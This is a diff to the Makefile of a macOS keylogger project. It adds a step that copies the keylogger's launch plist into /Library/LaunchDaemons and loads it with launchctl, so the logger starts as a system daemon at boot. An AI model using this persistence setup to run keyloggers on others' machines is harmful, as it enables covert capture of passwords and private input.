@@ -1,5 +1,6 @@
 LOGPATH = /var/log/keylogger.log
 PLIST=keylogger.plist
+LAUNCHPATH = /Library/LaunchDaemons
 EXECUTABLE=keylogger
 INSTALLDIR=/usr/local/bin
 
@@ -11,11 +12,12 @@ install: keylogger
 	cp $(EXECUTABLE) $(INSTALLDIR)
 
 startup: install
-	cp $(PLIST) /Library/LaunchDaemons
+	cp $(PLIST) $(LAUNCHPATH)
+	launchctl load $(LAUNCHPATH)/$(PLIST)
 
 uninstall:
 	rm $(INSTALLDIR)/$(EXECUTABLE)
-	rm /Library/LaunchDaemons/$(PLIST)
+	rm $(LAUNCHPATH)/$(PLIST)
 
 openlog:
 	open $(LOGPATH)
